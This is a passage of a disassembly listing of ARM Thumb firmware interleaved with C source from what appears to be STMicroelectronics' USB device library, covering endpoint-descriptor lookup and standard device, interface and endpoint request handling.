 800b74e:	b086      	sub	sp, #24
 800b750:	af00      	add	r7, sp, #0
 800b752:	6078      	str	r0, [r7, #4]
 800b754:	460b      	mov	r3, r1
 800b756:	70fb      	strb	r3, [r7, #3]
  USBD_DescHeaderTypeDef *pdesc = (USBD_DescHeaderTypeDef *)(void *)pConfDesc;
 800b758:	687b      	ldr	r3, [r7, #4]
 800b75a:	617b      	str	r3, [r7, #20]
  USBD_ConfigDescTypeDef *desc = (USBD_ConfigDescTypeDef *)(void *)pConfDesc;
 800b75c:	687b      	ldr	r3, [r7, #4]
 800b75e:	60fb      	str	r3, [r7, #12]
  USBD_EpDescTypeDef *pEpDesc = NULL;
 800b760:	2300      	movs	r3, #0
 800b762:	613b      	str	r3, [r7, #16]
  uint16_t ptr;

  if (desc->wTotalLength > desc->bLength)
 800b764:	68fb      	ldr	r3, [r7, #12]
 800b766:	885b      	ldrh	r3, [r3, #2]
 800b768:	b29a      	uxth	r2, r3
 800b76a:	68fb      	ldr	r3, [r7, #12]
 800b76c:	781b      	ldrb	r3, [r3, #0]
 800b76e:	b29b      	uxth	r3, r3
 800b770:	429a      	cmp	r2, r3
 800b772:	d920      	bls.n	800b7b6 <USBD_GetEpDesc+0x6a>
  {
    ptr = desc->bLength;
 800b774:	68fb      	ldr	r3, [r7, #12]
 800b776:	781b      	ldrb	r3, [r3, #0]
 800b778:	b29b      	uxth	r3, r3
 800b77a:	817b      	strh	r3, [r7, #10]

    while (ptr < desc->wTotalLength)
 800b77c:	e013      	b.n	800b7a6 <USBD_GetEpDesc+0x5a>
    {
      pdesc = USBD_GetNextDesc((uint8_t *)pdesc, &ptr);
 800b77e:	f107 030a 	add.w	r3, r7, #10
 800b782:	4619      	mov	r1, r3
 800b784:	6978      	ldr	r0, [r7, #20]
 800b786:	f000 f81b 	bl	800b7c0 <USBD_GetNextDesc>
 800b78a:	6178      	str	r0, [r7, #20]

      if (pdesc->bDescriptorType == USB_DESC_TYPE_ENDPOINT)
 800b78c:	697b      	ldr	r3, [r7, #20]
 800b78e:	785b      	ldrb	r3, [r3, #1]
 800b790:	2b05      	cmp	r3, #5
 800b792:	d108      	bne.n	800b7a6 <USBD_GetEpDesc+0x5a>
      {
        pEpDesc = (USBD_EpDescTypeDef *)(void *)pdesc;
 800b794:	697b      	ldr	r3, [r7, #20]
 800b796:	613b      	str	r3, [r7, #16]

        if (pEpDesc->bEndpointAddress == EpAddr)
 800b798:	693b      	ldr	r3, [r7, #16]
 800b79a:	789b      	ldrb	r3, [r3, #2]
 800b79c:	78fa      	ldrb	r2, [r7, #3]
 800b79e:	429a      	cmp	r2, r3
 800b7a0:	d008      	beq.n	800b7b4 <USBD_GetEpDesc+0x68>
        {
          break;
        }
        else
        {
          pEpDesc = NULL;
 800b7a2:	2300      	movs	r3, #0
 800b7a4:	613b      	str	r3, [r7, #16]
    while (ptr < desc->wTotalLength)
 800b7a6:	68fb      	ldr	r3, [r7, #12]
 800b7a8:	885b      	ldrh	r3, [r3, #2]
 800b7aa:	b29a      	uxth	r2, r3
 800b7ac:	897b      	ldrh	r3, [r7, #10]
 800b7ae:	429a      	cmp	r2, r3
 800b7b0:	d8e5      	bhi.n	800b77e <USBD_GetEpDesc+0x32>
 800b7b2:	e000      	b.n	800b7b6 <USBD_GetEpDesc+0x6a>
          break;
 800b7b4:	bf00      	nop
        }
      }
    }
  }

  return (void *)pEpDesc;
 800b7b6:	693b      	ldr	r3, [r7, #16]
}
 800b7b8:	4618      	mov	r0, r3
 800b7ba:	3718      	adds	r7, #24
 800b7bc:	46bd      	mov	sp, r7
 800b7be:	bd80      	pop	{r7, pc}

0800b7c0 <USBD_GetNextDesc>:
  * @param  buf: Buffer where the descriptor is available
  * @param  ptr: data pointer inside the descriptor
  * @retval next header
  */
USBD_DescHeaderTypeDef *USBD_GetNextDesc(uint8_t *pbuf, uint16_t *ptr)
{
 800b7c0:	b480      	push	{r7}
 800b7c2:	b085      	sub	sp, #20
 800b7c4:	af00      	add	r7, sp, #0
 800b7c6:	6078      	str	r0, [r7, #4]
 800b7c8:	6039      	str	r1, [r7, #0]
  USBD_DescHeaderTypeDef *pnext = (USBD_DescHeaderTypeDef *)(void *)pbuf;
 800b7ca:	687b      	ldr	r3, [r7, #4]
 800b7cc:	60fb      	str	r3, [r7, #12]

  *ptr += pnext->bLength;
 800b7ce:	683b      	ldr	r3, [r7, #0]
 800b7d0:	881a      	ldrh	r2, [r3, #0]
 800b7d2:	68fb      	ldr	r3, [r7, #12]
 800b7d4:	781b      	ldrb	r3, [r3, #0]
 800b7d6:	b29b      	uxth	r3, r3
 800b7d8:	4413      	add	r3, r2
 800b7da:	b29a      	uxth	r2, r3
 800b7dc:	683b      	ldr	r3, [r7, #0]
 800b7de:	801a      	strh	r2, [r3, #0]
  pnext = (USBD_DescHeaderTypeDef *)(void *)(pbuf + pnext->bLength);
 800b7e0:	68fb      	ldr	r3, [r7, #12]
 800b7e2:	781b      	ldrb	r3, [r3, #0]
 800b7e4:	461a      	mov	r2, r3
 800b7e6:	687b      	ldr	r3, [r7, #4]
 800b7e8:	4413      	add	r3, r2
 800b7ea:	60fb      	str	r3, [r7, #12]

  return (pnext);
 800b7ec:	68fb      	ldr	r3, [r7, #12]
}
 800b7ee:	4618      	mov	r0, r3
 800b7f0:	3714      	adds	r7, #20
 800b7f2:	46bd      	mov	sp, r7
 800b7f4:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b7f8:	4770      	bx	lr

0800b7fa <SWAPBYTE>:

/** @defgroup USBD_DEF_Exported_Macros
  * @{
  */
__STATIC_INLINE uint16_t SWAPBYTE(uint8_t *addr)
{
 800b7fa:	b480      	push	{r7}
 800b7fc:	b087      	sub	sp, #28
 800b7fe:	af00      	add	r7, sp, #0
 800b800:	6078      	str	r0, [r7, #4]
  uint16_t _SwapVal;
  uint16_t _Byte1;
  uint16_t _Byte2;
  uint8_t *_pbuff = addr;
 800b802:	687b      	ldr	r3, [r7, #4]
 800b804:	617b      	str	r3, [r7, #20]

  _Byte1 = *(uint8_t *)_pbuff;
 800b806:	697b      	ldr	r3, [r7, #20]
 800b808:	781b      	ldrb	r3, [r3, #0]
 800b80a:	827b      	strh	r3, [r7, #18]
  _pbuff++;
 800b80c:	697b      	ldr	r3, [r7, #20]
 800b80e:	3301      	adds	r3, #1
 800b810:	617b      	str	r3, [r7, #20]
  _Byte2 = *(uint8_t *)_pbuff;
 800b812:	697b      	ldr	r3, [r7, #20]
 800b814:	781b      	ldrb	r3, [r3, #0]
 800b816:	823b      	strh	r3, [r7, #16]

  _SwapVal = (_Byte2 << 8) | _Byte1;
 800b818:	8a3b      	ldrh	r3, [r7, #16]
 800b81a:	021b      	lsls	r3, r3, #8
 800b81c:	b21a      	sxth	r2, r3
 800b81e:	f9b7 3012 	ldrsh.w	r3, [r7, #18]
 800b822:	4313      	orrs	r3, r2
 800b824:	b21b      	sxth	r3, r3
 800b826:	81fb      	strh	r3, [r7, #14]

  return _SwapVal;
 800b828:	89fb      	ldrh	r3, [r7, #14]
}
 800b82a:	4618      	mov	r0, r3
 800b82c:	371c      	adds	r7, #28
 800b82e:	46bd      	mov	sp, r7
 800b830:	f85d 7b04 	ldr.w	r7, [sp], #4
 800b834:	4770      	bx	lr
	...

0800b838 <USBD_StdDevReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdDevReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b838:	b580      	push	{r7, lr}
 800b83a:	b084      	sub	sp, #16
 800b83c:	af00      	add	r7, sp, #0
 800b83e:	6078      	str	r0, [r7, #4]
 800b840:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b842:	2300      	movs	r3, #0
 800b844:	73fb      	strb	r3, [r7, #15]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b846:	683b      	ldr	r3, [r7, #0]
 800b848:	781b      	ldrb	r3, [r3, #0]
 800b84a:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b84e:	2b40      	cmp	r3, #64	; 0x40
 800b850:	d005      	beq.n	800b85e <USBD_StdDevReq+0x26>
 800b852:	2b40      	cmp	r3, #64	; 0x40
 800b854:	d857      	bhi.n	800b906 <USBD_StdDevReq+0xce>
 800b856:	2b00      	cmp	r3, #0
 800b858:	d00f      	beq.n	800b87a <USBD_StdDevReq+0x42>
 800b85a:	2b20      	cmp	r3, #32
 800b85c:	d153      	bne.n	800b906 <USBD_StdDevReq+0xce>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      ret = (USBD_StatusTypeDef)pdev->pClass[pdev->classId]->Setup(pdev, req);
 800b85e:	687b      	ldr	r3, [r7, #4]
 800b860:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 800b864:	687b      	ldr	r3, [r7, #4]
 800b866:	32ae      	adds	r2, #174	; 0xae
 800b868:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b86c:	689b      	ldr	r3, [r3, #8]
 800b86e:	6839      	ldr	r1, [r7, #0]
 800b870:	6878      	ldr	r0, [r7, #4]
 800b872:	4798      	blx	r3
 800b874:	4603      	mov	r3, r0
 800b876:	73fb      	strb	r3, [r7, #15]
      break;
 800b878:	e04a      	b.n	800b910 <USBD_StdDevReq+0xd8>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800b87a:	683b      	ldr	r3, [r7, #0]
 800b87c:	785b      	ldrb	r3, [r3, #1]
 800b87e:	2b09      	cmp	r3, #9
 800b880:	d83b      	bhi.n	800b8fa <USBD_StdDevReq+0xc2>
 800b882:	a201      	add	r2, pc, #4	; (adr r2, 800b888 <USBD_StdDevReq+0x50>)
 800b884:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800b888:	0800b8dd 	.word	0x0800b8dd
 800b88c:	0800b8f1 	.word	0x0800b8f1
 800b890:	0800b8fb 	.word	0x0800b8fb
 800b894:	0800b8e7 	.word	0x0800b8e7
 800b898:	0800b8fb 	.word	0x0800b8fb
 800b89c:	0800b8bb 	.word	0x0800b8bb
 800b8a0:	0800b8b1 	.word	0x0800b8b1
 800b8a4:	0800b8fb 	.word	0x0800b8fb
 800b8a8:	0800b8d3 	.word	0x0800b8d3
 800b8ac:	0800b8c5 	.word	0x0800b8c5
      {
        case USB_REQ_GET_DESCRIPTOR:
          USBD_GetDescriptor(pdev, req);
 800b8b0:	6839      	ldr	r1, [r7, #0]
 800b8b2:	6878      	ldr	r0, [r7, #4]
 800b8b4:	f000 fa3c 	bl	800bd30 <USBD_GetDescriptor>
          break;
 800b8b8:	e024      	b.n	800b904 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_ADDRESS:
          USBD_SetAddress(pdev, req);
 800b8ba:	6839      	ldr	r1, [r7, #0]
 800b8bc:	6878      	ldr	r0, [r7, #4]
 800b8be:	f000 fbcb 	bl	800c058 <USBD_SetAddress>
          break;
 800b8c2:	e01f      	b.n	800b904 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_CONFIGURATION:
          ret = USBD_SetConfig(pdev, req);
 800b8c4:	6839      	ldr	r1, [r7, #0]
 800b8c6:	6878      	ldr	r0, [r7, #4]
 800b8c8:	f000 fc0a 	bl	800c0e0 <USBD_SetConfig>
 800b8cc:	4603      	mov	r3, r0
 800b8ce:	73fb      	strb	r3, [r7, #15]
          break;
 800b8d0:	e018      	b.n	800b904 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_CONFIGURATION:
          USBD_GetConfig(pdev, req);
 800b8d2:	6839      	ldr	r1, [r7, #0]
 800b8d4:	6878      	ldr	r0, [r7, #4]
 800b8d6:	f000 fcad 	bl	800c234 <USBD_GetConfig>
          break;
 800b8da:	e013      	b.n	800b904 <USBD_StdDevReq+0xcc>

        case USB_REQ_GET_STATUS:
          USBD_GetStatus(pdev, req);
 800b8dc:	6839      	ldr	r1, [r7, #0]
 800b8de:	6878      	ldr	r0, [r7, #4]
 800b8e0:	f000 fcde 	bl	800c2a0 <USBD_GetStatus>
          break;
 800b8e4:	e00e      	b.n	800b904 <USBD_StdDevReq+0xcc>

        case USB_REQ_SET_FEATURE:
          USBD_SetFeature(pdev, req);
 800b8e6:	6839      	ldr	r1, [r7, #0]
 800b8e8:	6878      	ldr	r0, [r7, #4]
 800b8ea:	f000 fd0d 	bl	800c308 <USBD_SetFeature>
          break;
 800b8ee:	e009      	b.n	800b904 <USBD_StdDevReq+0xcc>

        case USB_REQ_CLEAR_FEATURE:
          USBD_ClrFeature(pdev, req);
 800b8f0:	6839      	ldr	r1, [r7, #0]
 800b8f2:	6878      	ldr	r0, [r7, #4]
 800b8f4:	f000 fd31 	bl	800c35a <USBD_ClrFeature>
          break;
 800b8f8:	e004      	b.n	800b904 <USBD_StdDevReq+0xcc>

        default:
          USBD_CtlError(pdev, req);
 800b8fa:	6839      	ldr	r1, [r7, #0]
 800b8fc:	6878      	ldr	r0, [r7, #4]
 800b8fe:	f000 fd88 	bl	800c412 <USBD_CtlError>
          break;
 800b902:	bf00      	nop
      }
      break;
 800b904:	e004      	b.n	800b910 <USBD_StdDevReq+0xd8>

    default:
      USBD_CtlError(pdev, req);
 800b906:	6839      	ldr	r1, [r7, #0]
 800b908:	6878      	ldr	r0, [r7, #4]
 800b90a:	f000 fd82 	bl	800c412 <USBD_CtlError>
      break;
 800b90e:	bf00      	nop
  }

  return ret;
 800b910:	7bfb      	ldrb	r3, [r7, #15]
}
 800b912:	4618      	mov	r0, r3
 800b914:	3710      	adds	r7, #16
 800b916:	46bd      	mov	sp, r7
 800b918:	bd80      	pop	{r7, pc}
 800b91a:	bf00      	nop

0800b91c <USBD_StdItfReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdItfReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b91c:	b580      	push	{r7, lr}
 800b91e:	b084      	sub	sp, #16
 800b920:	af00      	add	r7, sp, #0
 800b922:	6078      	str	r0, [r7, #4]
 800b924:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800b926:	2300      	movs	r3, #0
 800b928:	73fb      	strb	r3, [r7, #15]
  uint8_t idx;

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800b92a:	683b      	ldr	r3, [r7, #0]
 800b92c:	781b      	ldrb	r3, [r3, #0]
 800b92e:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800b932:	2b40      	cmp	r3, #64	; 0x40
 800b934:	d005      	beq.n	800b942 <USBD_StdItfReq+0x26>
 800b936:	2b40      	cmp	r3, #64	; 0x40
 800b938:	d852      	bhi.n	800b9e0 <USBD_StdItfReq+0xc4>
 800b93a:	2b00      	cmp	r3, #0
 800b93c:	d001      	beq.n	800b942 <USBD_StdItfReq+0x26>
 800b93e:	2b20      	cmp	r3, #32
 800b940:	d14e      	bne.n	800b9e0 <USBD_StdItfReq+0xc4>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
    case USB_REQ_TYPE_STANDARD:
      switch (pdev->dev_state)
 800b942:	687b      	ldr	r3, [r7, #4]
 800b944:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800b948:	b2db      	uxtb	r3, r3
 800b94a:	3b01      	subs	r3, #1
 800b94c:	2b02      	cmp	r3, #2
 800b94e:	d840      	bhi.n	800b9d2 <USBD_StdItfReq+0xb6>
      {
        case USBD_STATE_DEFAULT:
        case USBD_STATE_ADDRESSED:
        case USBD_STATE_CONFIGURED:

          if (LOBYTE(req->wIndex) <= USBD_MAX_NUM_INTERFACES)
 800b950:	683b      	ldr	r3, [r7, #0]
 800b952:	889b      	ldrh	r3, [r3, #4]
 800b954:	b2db      	uxtb	r3, r3
 800b956:	2b01      	cmp	r3, #1
 800b958:	d836      	bhi.n	800b9c8 <USBD_StdItfReq+0xac>
          {
            /* Get the class index relative to this interface */
            idx = USBD_CoreFindIF(pdev, LOBYTE(req->wIndex));
 800b95a:	683b      	ldr	r3, [r7, #0]
 800b95c:	889b      	ldrh	r3, [r3, #4]
 800b95e:	b2db      	uxtb	r3, r3
 800b960:	4619      	mov	r1, r3
 800b962:	6878      	ldr	r0, [r7, #4]
 800b964:	f7ff fed8 	bl	800b718 <USBD_CoreFindIF>
 800b968:	4603      	mov	r3, r0
 800b96a:	73bb      	strb	r3, [r7, #14]
            if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800b96c:	7bbb      	ldrb	r3, [r7, #14]
 800b96e:	2bff      	cmp	r3, #255	; 0xff
 800b970:	d01d      	beq.n	800b9ae <USBD_StdItfReq+0x92>
 800b972:	7bbb      	ldrb	r3, [r7, #14]
 800b974:	2b00      	cmp	r3, #0
 800b976:	d11a      	bne.n	800b9ae <USBD_StdItfReq+0x92>
            {
              /* Call the class data out function to manage the request */
              if (pdev->pClass[idx]->Setup != NULL)
 800b978:	7bba      	ldrb	r2, [r7, #14]
 800b97a:	687b      	ldr	r3, [r7, #4]
 800b97c:	32ae      	adds	r2, #174	; 0xae
 800b97e:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b982:	689b      	ldr	r3, [r3, #8]
 800b984:	2b00      	cmp	r3, #0
 800b986:	d00f      	beq.n	800b9a8 <USBD_StdItfReq+0x8c>
              {
                pdev->classId = idx;
 800b988:	7bba      	ldrb	r2, [r7, #14]
 800b98a:	687b      	ldr	r3, [r7, #4]
 800b98c:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
                ret = (USBD_StatusTypeDef)(pdev->pClass[idx]->Setup(pdev, req));
 800b990:	7bba      	ldrb	r2, [r7, #14]
 800b992:	687b      	ldr	r3, [r7, #4]
 800b994:	32ae      	adds	r2, #174	; 0xae
 800b996:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800b99a:	689b      	ldr	r3, [r3, #8]
 800b99c:	6839      	ldr	r1, [r7, #0]
 800b99e:	6878      	ldr	r0, [r7, #4]
 800b9a0:	4798      	blx	r3
 800b9a2:	4603      	mov	r3, r0
 800b9a4:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b9a6:	e004      	b.n	800b9b2 <USBD_StdItfReq+0x96>
              }
              else
              {
                /* should never reach this condition */
                ret = USBD_FAIL;
 800b9a8:	2303      	movs	r3, #3
 800b9aa:	73fb      	strb	r3, [r7, #15]
              if (pdev->pClass[idx]->Setup != NULL)
 800b9ac:	e001      	b.n	800b9b2 <USBD_StdItfReq+0x96>
              }
            }
            else
            {
              /* No relative interface found */
              ret = USBD_FAIL;
 800b9ae:	2303      	movs	r3, #3
 800b9b0:	73fb      	strb	r3, [r7, #15]
            }

            if ((req->wLength == 0U) && (ret == USBD_OK))
 800b9b2:	683b      	ldr	r3, [r7, #0]
 800b9b4:	88db      	ldrh	r3, [r3, #6]
 800b9b6:	2b00      	cmp	r3, #0
 800b9b8:	d110      	bne.n	800b9dc <USBD_StdItfReq+0xc0>
 800b9ba:	7bfb      	ldrb	r3, [r7, #15]
 800b9bc:	2b00      	cmp	r3, #0
 800b9be:	d10d      	bne.n	800b9dc <USBD_StdItfReq+0xc0>
            {
              (void)USBD_CtlSendStatus(pdev);
 800b9c0:	6878      	ldr	r0, [r7, #4]
 800b9c2:	f000 fdf1 	bl	800c5a8 <USBD_CtlSendStatus>
          }
          else
          {
            USBD_CtlError(pdev, req);
          }
          break;
 800b9c6:	e009      	b.n	800b9dc <USBD_StdItfReq+0xc0>
            USBD_CtlError(pdev, req);
 800b9c8:	6839      	ldr	r1, [r7, #0]
 800b9ca:	6878      	ldr	r0, [r7, #4]
 800b9cc:	f000 fd21 	bl	800c412 <USBD_CtlError>
          break;
 800b9d0:	e004      	b.n	800b9dc <USBD_StdItfReq+0xc0>

        default:
          USBD_CtlError(pdev, req);
 800b9d2:	6839      	ldr	r1, [r7, #0]
 800b9d4:	6878      	ldr	r0, [r7, #4]
 800b9d6:	f000 fd1c 	bl	800c412 <USBD_CtlError>
          break;
 800b9da:	e000      	b.n	800b9de <USBD_StdItfReq+0xc2>
          break;
 800b9dc:	bf00      	nop
      }
      break;
 800b9de:	e004      	b.n	800b9ea <USBD_StdItfReq+0xce>

    default:
      USBD_CtlError(pdev, req);
 800b9e0:	6839      	ldr	r1, [r7, #0]
 800b9e2:	6878      	ldr	r0, [r7, #4]
 800b9e4:	f000 fd15 	bl	800c412 <USBD_CtlError>
      break;
 800b9e8:	bf00      	nop
  }

  return ret;
 800b9ea:	7bfb      	ldrb	r3, [r7, #15]
}
 800b9ec:	4618      	mov	r0, r3
 800b9ee:	3710      	adds	r7, #16
 800b9f0:	46bd      	mov	sp, r7
 800b9f2:	bd80      	pop	{r7, pc}

0800b9f4 <USBD_StdEPReq>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
USBD_StatusTypeDef USBD_StdEPReq(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800b9f4:	b580      	push	{r7, lr}
 800b9f6:	b084      	sub	sp, #16
 800b9f8:	af00      	add	r7, sp, #0
 800b9fa:	6078      	str	r0, [r7, #4]
 800b9fc:	6039      	str	r1, [r7, #0]
  USBD_EndpointTypeDef *pep;
  uint8_t ep_addr;
  uint8_t idx;
  USBD_StatusTypeDef ret = USBD_OK;
 800b9fe:	2300      	movs	r3, #0
 800ba00:	73fb      	strb	r3, [r7, #15]

  ep_addr = LOBYTE(req->wIndex);
 800ba02:	683b      	ldr	r3, [r7, #0]
 800ba04:	889b      	ldrh	r3, [r3, #4]
 800ba06:	73bb      	strb	r3, [r7, #14]

  switch (req->bmRequest & USB_REQ_TYPE_MASK)
 800ba08:	683b      	ldr	r3, [r7, #0]
 800ba0a:	781b      	ldrb	r3, [r3, #0]
 800ba0c:	f003 0360 	and.w	r3, r3, #96	; 0x60
 800ba10:	2b40      	cmp	r3, #64	; 0x40
 800ba12:	d007      	beq.n	800ba24 <USBD_StdEPReq+0x30>
 800ba14:	2b40      	cmp	r3, #64	; 0x40
 800ba16:	f200 817f 	bhi.w	800bd18 <USBD_StdEPReq+0x324>
 800ba1a:	2b00      	cmp	r3, #0
 800ba1c:	d02a      	beq.n	800ba74 <USBD_StdEPReq+0x80>
 800ba1e:	2b20      	cmp	r3, #32
 800ba20:	f040 817a 	bne.w	800bd18 <USBD_StdEPReq+0x324>
  {
    case USB_REQ_TYPE_CLASS:
    case USB_REQ_TYPE_VENDOR:
      /* Get the class index relative to this endpoint */
      idx = USBD_CoreFindEP(pdev, ep_addr);
 800ba24:	7bbb      	ldrb	r3, [r7, #14]
 800ba26:	4619      	mov	r1, r3
 800ba28:	6878      	ldr	r0, [r7, #4]
 800ba2a:	f7ff fe82 	bl	800b732 <USBD_CoreFindEP>
 800ba2e:	4603      	mov	r3, r0
 800ba30:	737b      	strb	r3, [r7, #13]
      if (((uint8_t)idx != 0xFFU) && (idx < USBD_MAX_SUPPORTED_CLASS))
 800ba32:	7b7b      	ldrb	r3, [r7, #13]
 800ba34:	2bff      	cmp	r3, #255	; 0xff
 800ba36:	f000 8174 	beq.w	800bd22 <USBD_StdEPReq+0x32e>
 800ba3a:	7b7b      	ldrb	r3, [r7, #13]
 800ba3c:	2b00      	cmp	r3, #0
 800ba3e:	f040 8170 	bne.w	800bd22 <USBD_StdEPReq+0x32e>
      {
        pdev->classId = idx;
 800ba42:	7b7a      	ldrb	r2, [r7, #13]
 800ba44:	687b      	ldr	r3, [r7, #4]
 800ba46:	f8c3 22d4 	str.w	r2, [r3, #724]	; 0x2d4
        /* Call the class data out function to manage the request */
        if (pdev->pClass[idx]->Setup != NULL)
 800ba4a:	7b7a      	ldrb	r2, [r7, #13]
 800ba4c:	687b      	ldr	r3, [r7, #4]
 800ba4e:	32ae      	adds	r2, #174	; 0xae
 800ba50:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ba54:	689b      	ldr	r3, [r3, #8]
 800ba56:	2b00      	cmp	r3, #0
 800ba58:	f000 8163 	beq.w	800bd22 <USBD_StdEPReq+0x32e>
        {
          ret = (USBD_StatusTypeDef)pdev->pClass[idx]->Setup(pdev, req);
 800ba5c:	7b7a      	ldrb	r2, [r7, #13]
 800ba5e:	687b      	ldr	r3, [r7, #4]
 800ba60:	32ae      	adds	r2, #174	; 0xae
 800ba62:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 800ba66:	689b      	ldr	r3, [r3, #8]
 800ba68:	6839      	ldr	r1, [r7, #0]
 800ba6a:	6878      	ldr	r0, [r7, #4]
 800ba6c:	4798      	blx	r3
 800ba6e:	4603      	mov	r3, r0
 800ba70:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 800ba72:	e156      	b.n	800bd22 <USBD_StdEPReq+0x32e>

    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 800ba74:	683b      	ldr	r3, [r7, #0]
 800ba76:	785b      	ldrb	r3, [r3, #1]
 800ba78:	2b03      	cmp	r3, #3
 800ba7a:	d008      	beq.n	800ba8e <USBD_StdEPReq+0x9a>
 800ba7c:	2b03      	cmp	r3, #3
 800ba7e:	f300 8145 	bgt.w	800bd0c <USBD_StdEPReq+0x318>
 800ba82:	2b00      	cmp	r3, #0
 800ba84:	f000 809b 	beq.w	800bbbe <USBD_StdEPReq+0x1ca>
 800ba88:	2b01      	cmp	r3, #1
 800ba8a:	d03c      	beq.n	800bb06 <USBD_StdEPReq+0x112>
 800ba8c:	e13e      	b.n	800bd0c <USBD_StdEPReq+0x318>
      {
        case USB_REQ_SET_FEATURE:
          switch (pdev->dev_state)
 800ba8e:	687b      	ldr	r3, [r7, #4]
 800ba90:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800ba94:	b2db      	uxtb	r3, r3
 800ba96:	2b02      	cmp	r3, #2
 800ba98:	d002      	beq.n	800baa0 <USBD_StdEPReq+0xac>
 800ba9a:	2b03      	cmp	r3, #3
 800ba9c:	d016      	beq.n	800bacc <USBD_StdEPReq+0xd8>
 800ba9e:	e02c      	b.n	800bafa <USBD_StdEPReq+0x106>
          {
            case USBD_STATE_ADDRESSED:
              if ((ep_addr != 0x00U) && (ep_addr != 0x80U))
 800baa0:	7bbb      	ldrb	r3, [r7, #14]
 800baa2:	2b00      	cmp	r3, #0
 800baa4:	d00d      	beq.n	800bac2 <USBD_StdEPReq+0xce>
 800baa6:	7bbb      	ldrb	r3, [r7, #14]
 800baa8:	2b80      	cmp	r3, #128	; 0x80
 800baaa:	d00a      	beq.n	800bac2 <USBD_StdEPReq+0xce>
              {
                (void)USBD_LL_StallEP(pdev, ep_addr);
 800baac:	7bbb      	ldrb	r3, [r7, #14]
 800baae:	4619      	mov	r1, r3
 800bab0:	6878      	ldr	r0, [r7, #4]
 800bab2:	f001 fa21 	bl	800cef8 <USBD_LL_StallEP>
                (void)USBD_LL_StallEP(pdev, 0x80U);
 800bab6:	2180      	movs	r1, #128	; 0x80
 800bab8:	6878      	ldr	r0, [r7, #4]
 800baba:	f001 fa1d 	bl	800cef8 <USBD_LL_StallEP>
 800babe:	bf00      	nop
              }
              else
              {
                USBD_CtlError(pdev, req);
              }
              break;
 800bac0:	e020      	b.n	800bb04 <USBD_StdEPReq+0x110>
                USBD_CtlError(pdev, req);
 800bac2:	6839      	ldr	r1, [r7, #0]
 800bac4:	6878      	ldr	r0, [r7, #4]
 800bac6:	f000 fca4 	bl	800c412 <USBD_CtlError>
              break;
 800baca:	e01b      	b.n	800bb04 <USBD_StdEPReq+0x110>

            case USBD_STATE_CONFIGURED:
              if (req->wValue == USB_FEATURE_EP_HALT)
 800bacc:	683b      	ldr	r3, [r7, #0]
 800bace:	885b      	ldrh	r3, [r3, #2]
 800bad0:	2b00      	cmp	r3, #0
 800bad2:	d10e      	bne.n	800baf2 <USBD_StdEPReq+0xfe>
              {
                if ((ep_addr != 0x00U) && (ep_addr != 0x80U) && (req->wLength == 0x00U))
 800bad4:	7bbb      	ldrb	r3, [r7, #14]
 800bad6:	2b00      	cmp	r3, #0
 800bad8:	d00b      	beq.n	800baf2 <USBD_StdEPReq+0xfe>
 800bada:	7bbb      	ldrb	r3, [r7, #14]
 800badc:	2b80      	cmp	r3, #128	; 0x80
 800bade:	d008      	beq.n	800baf2 <USBD_StdEPReq+0xfe>
 800bae0:	683b      	ldr	r3, [r7, #0]
 800bae2:	88db      	ldrh	r3, [r3, #6]
 800bae4:	2b00      	cmp	r3, #0
 800bae6:	d104      	bne.n	800baf2 <USBD_StdEPReq+0xfe>
                {
                  (void)USBD_LL_StallEP(pdev, ep_addr);
 800bae8:	7bbb      	ldrb	r3, [r7, #14]
 800baea:	4619      	mov	r1, r3
 800baec:	6878      	ldr	r0, [r7, #4]
 800baee:	f001 fa03 	bl	800cef8 <USBD_LL_StallEP>
                }
              }
              (void)USBD_CtlSendStatus(pdev);
 800baf2:	6878      	ldr	r0, [r7, #4]
 800baf4:	f000 fd58 	bl	800c5a8 <USBD_CtlSendStatus>

              break;
 800baf8:	e004      	b.n	800bb04 <USBD_StdEPReq+0x110>

            default:
              USBD_CtlError(pdev, req);
 800bafa:	6839      	ldr	r1, [r7, #0]
 800bafc:	6878      	ldr	r0, [r7, #4]
 800bafe:	f000 fc88 	bl	800c412 <USBD_CtlError>
              break;
 800bb02:	bf00      	nop
          }
          break;
 800bb04:	e107      	b.n	800bd16 <USBD_StdEPReq+0x322>

        case USB_REQ_CLEAR_FEATURE:

          switch (pdev->dev_state)
 800bb06:	687b      	ldr	r3, [r7, #4]
 800bb08:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
